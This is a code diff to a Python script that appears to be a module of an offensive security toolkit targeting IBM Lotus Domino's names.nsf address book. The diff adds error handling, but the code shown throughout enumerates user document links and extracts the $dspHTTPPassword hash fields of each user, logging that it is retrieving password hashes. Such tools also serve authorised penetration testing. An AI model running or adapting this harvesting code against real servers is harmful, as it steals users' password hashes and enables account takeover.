@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 # standard module
 import re
@@ -50,12 +50,23 @@ def run(args):
     base = proto + args['rhost'] + args['targeturi']
     page = '/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&TemplateType=2&Seq=1&Start='
 
-    r = requests.get(base + path, auth=(user, passwd), verify=False)
+    try:
+        r = requests.get(base + path, auth=(user, passwd), verify=False)
+    except requests.exceptions.RequestException as e:
+        logging.error('Requests exception - {}'.format(e))
+        return
+
+
     tmplist = re.findall(r'<a href="(/names\.nsf/[0-9a-z]*/[0-9a-z]*\?OpenDocument)', r.text)
     sresults = list(set(tmplist))
     count = len(sresults)
     while len(tmplist) != 0:
-        r = requests.get(base + page + str(count), auth=(user, passwd), verify=False)
+        try:
+            r = requests.get(base + page + str(count), auth=(user, passwd), verify=False)
+        except requests.exceptions.RequestException as e:
+            logging.debug('Requests exception - {}'.format(e))
+            logging.debug('Stopping retrieval of user links')
+            break
         tmplist = re.findall(r'<a href="(/names\.nsf/[0-9a-z]*/[0-9a-z]*\?OpenDocument)', r.text)
         sresults += list(set(tmplist))
         count = len(sresults)
@@ -63,7 +74,12 @@ def run(args):
 
     logging.info('Retrieving password hashes...')
     for res in sresults:
-        r = requests.get(base + res, auth=(user, passwd), verify=False)
+        try:
+            r = requests.get(base + res, auth=(user, passwd), verify=False)
+        except requests.exceptions.RequestException as e:
+            logging.debug('Requests exception - {}'.format(e))
+            logging.debug('Moving to next user link')
+            continue
         tree = html.fromstring(r.content)
         username = tree.xpath('//input[@name="$dspShortName"]/@value')[0]
         if tree.xpath('//input[@name="$dspHTTPPassword"]/@value') != []:
